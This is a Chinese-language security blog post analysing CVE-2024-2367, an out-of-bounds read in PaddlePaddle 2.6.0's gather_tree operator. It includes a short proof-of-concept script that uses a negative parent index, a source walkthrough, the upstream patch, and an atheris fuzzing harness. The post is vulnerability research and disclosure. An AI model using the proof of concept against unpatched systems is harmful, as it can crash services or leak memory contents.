---
title: AI/ML漏洞调研
tags:
  - AI
  - ML
date: 2024-07-15 14:26:55
---


人工智能的发展已经是不可阻挡的趋势，最近AGI和agent的项目出现了很多。本文调研一个百度paddle的漏洞。

## paddlepaddle/paddle

paddle是百度的一个模型训练和推理一个框架，其还有`paddlelite`可以做移动端的推理，他们还提供了丰富的即拿即用的模型应对各种的生产环境。

### CVE-2024-2367


- 复现

这个漏洞被发现时是`paddlepaddle==2.6.0`的版本，可以简单的使用conda装一个这样的环境去测试。

```
conda create -n py3.8 python=3.8
conda activate py3.8
pip install paddlepaddle==2.6.0
python poc.py
```

poc.py
```
import paddle
import numpy as np

x = np.array([[[0]], [[0]]], dtype=np.int32)
ids = paddle.to_tensor(x)
parents = paddle.to_tensor(np.array([[[0]], [[-0x1234567]]], dtype=np.int32))

out = paddle.nn.functional.gather_tree(ids, parents)

print(out)
```

![](/assets/image/192010.png)

漏洞点在于gather_tree这个API，它用于计算Beam Search算法得出的序列。你可以不用关注这个算法具体的内容，可以抽象的认为需要向gather_tree传入两个tensor`ids`和`parents`，它们都是三个维度，第一个维度表示多少个时间序列(steps)，第二个表示batchsize，第三个表示Beam Search算法的参数。

> paddle.nn.functional.gather_tree(ids, parents): 在整个束搜索 (Beam Search) 结束后使用。在搜索结束后，可以获得每个时间步选择的的候选词 id 及其对应的在搜索树中的 parent 节点，ids 和 parents 的形状布局均为 [max_time,batch_size,beam_size]，从最后一个时间步回溯产生完整的 id 序列。



- 分析

我们先在python层进行调试，`gather_tree`算子简单的检测了`ids`和`parents`的维度就进入里CPP层。

![](/assets/image/20240506203137.png)

接着使用gdb去调试`libpaddle.so`库，在崩溃点确实看到了同样的栈回溯信息，同时也能观察到`libpaddle.so`是没有debug_info的，无法追踪到代码的行信息。崩溃的函数的签名是`void phi::GatherTreeKernel<int, phi::CPUContext>(phi::CPUContext const&, phi::DenseTensor const&, phi::DenseTensor const&, phi::DenseTensor*)`，尽管可以在此函数打breakpoint，但是`libpaddle.so`没有符号，没办法观察源码。

![](/assets/image/20240506204223.png)

在这样一个白盒条件下，我们可以查询[源码](https://github.com/PaddlePaddle/Paddle/blob/v2.6.0/paddle/phi/kernels/cpu/gather_tree_kernel.cc#L72)能够找到对应的算子的注册，以及其模板函数。

<right> {% inlineImg /assets/image/20240506201942.png 50px %} </right>

```c
template <typename T, typename Context>
void GatherTreeKernel(const Context &dev_ctx,
                      const DenseTensor &ids,
                      const DenseTensor &parents,
                      DenseTensor *out) {
  const auto *ids_data = ids.data<T>();
  const auto *parents_data = parents.data<T>();

  T *out_data = dev_ctx.template Alloc<T>(out);

  auto &ids_dims = ids.dims();
  int64_t max_length = ids_dims[0];
  auto batch_size = ids_dims[1];
  auto beam_size = ids_dims[2];
  // 从维度中取出三个参数
  PADDLE_ENFORCE_NOT_NULL(ids_data,
                          phi::errors::InvalidArgument(
                              "Input(Ids) of gather_tree should not be null."));

  PADDLE_ENFORCE_NOT_NULL(
      parents_data,
      phi::errors::InvalidArgument(
          "Input(Parents) of gather_tree should not be null."));

  for (int batch = 0; batch < batch_size; batch++) {
    for (int beam = 0; beam < beam_size; beam++) {
      auto idx =
          (max_length - 1) * batch_size * beam_size + batch * beam_size + beam;
      out_data[idx] = ids_data[idx];
      auto parent = parents_data[idx];
      // out_data[max_length-1][batch][beam] = ids_data[max_length-1][batch][beam]
      // auto parent = parents_data[max_length-1][batch][beam];
      for (int64_t step = max_length - 2; step >= 0; step--) {
        PADDLE_ENFORCE_LT(
            parent,
            beam_size,
            phi::errors::InvalidArgument(
                "The parents must be less than beam size, but received"
                "parents %d is greater than or equal to beam size %d. ",
                parent,
                beam_size));

        idx = step * batch_size * beam_size + batch * beam_size;
        out_data[idx + beam] = ids_data[idx + parent];   // <= maybe OOB read
        parent = parents_data[idx + parent];
        // out_data[step][batch][beam] = ids_data[step][batch][parent]
        // parent = parents_data[step][batch][parent];
      }
    }
  }
}

```

python端的`ids`和`parents`最终传到了`const DenseTensor &ids`和`const DenseTensor &parents`。由python端判断的它们的维度为3，在这里一个一个取出来。`PADDLE_ENFORCE_NOT_NULL`的断言是为了保证ids和parents不为空指针。

由于在C/CPP中无法在编译时预测出这些数组的形状，没办法使用`arrayPointer[x][y][z]`，想操作对应的元素只能手动计算`arrayPointer[x * (dim[1]*dim[2]) + y * (dim[2]) + z]`。

漏洞的关键在于`auto parent = parents_data[idx];`赋值时，parent可以为{% label 负值 red %}，尽管在PADDLE_ENFORCE_LT断言了一下parent要小于beam_size，但是并没有断言parrent要大于0。反过来看poc.py,`-0x1234567`便是充当这个溢出的parrent。接下来便是不可预期的行为了，parent逐步迭代，不断地从未知内存里窃取信息放到`out_data`里，能达到OOB Read，但是由于用于写的数组并没有使用parrent计算索引，无法实现OOB Write。

我手动编译了paddle的python库，添加了符号，使用gdb进行调试，确实应证了我们之前的分析。

![](/assets/image/20240507133037.png)

此外，`gather_tree`算子并不是第一次出问题了，2022年的paddle [CVE-2022-46741](https://github.com/PaddlePaddle/Paddle/blob/52a811f9138a4404b07d38cce52129efeb6f77ae/security/advisory/pdsa-2022-001.md)就出现了漏洞，上图PADDLE_ENFORCE_LT就是当时添加的patch。还有tensorfow的[issue#125](https://github.com/tensorflow/addons/issues/125)也出现了类似的错误。


- 补丁

paddle团队在[#62826](https://github.com/PaddlePaddle/Paddle/commit/765c669d5bc61faa714bf4410c83bb50da429dda)打上了这个Patch，添加了一个断言parent要大于等于0。

![](/assets/image/20240507174121.png)


- fuzz

我使用python的atheris库尝试去fuzz gather_tree这个算子，只需要简单的mutate，就能够收到本漏洞的crash。但是atheris只能`Atheris will report a failure if the Python code under test throws an uncaught exception`，对于这种segmentation fault，直接导致了线程的crash就没办法自动保存当时的输入，可以选择在代码中手动保存。

![](/assets/image/20240508101801.png)

```
import atheris

with atheris.instrument_imports():
    import sys
    import math
    import paddle

IgnoredErrors = (ValueError, RuntimeError, TypeError, AttributeError,
                 AssertionError)

def TestOneInput(data):
    with open('crash', 'wb') as fp:
        fp.write(data)
        fp.flush()

    rank = 3
    fdp = atheris.FuzzedDataProvider(data)
    dims = fdp.ConsumeIntListInRange(rank, 1, 16)

    nNum = math.prod(dims)
    ids = fdp.ConsumeIntList(nNum, 4)
    parents = fdp.ConsumeIntList(nNum, 4)

    idsTensor = paddle.to_tensor(ids, dtype=paddle.int32)
    idsTensor = paddle.reshape(idsTensor, dims)

    parentsTensor = paddle.to_tensor(parents, dtype=paddle.int32)
    parentsTensor = paddle.reshape(parentsTensor, dims)

    try:
        paddle.nn.functional.gather_tree(idsTensor, parentsTensor)
    except IgnoredErrors:
        return

atheris.Setup(sys.argv, TestOneInput)
atheris.Fuzz()

# with open('crash', 'rb') as fp:
#     data = fp.read()
# TestOneInput(data)
```
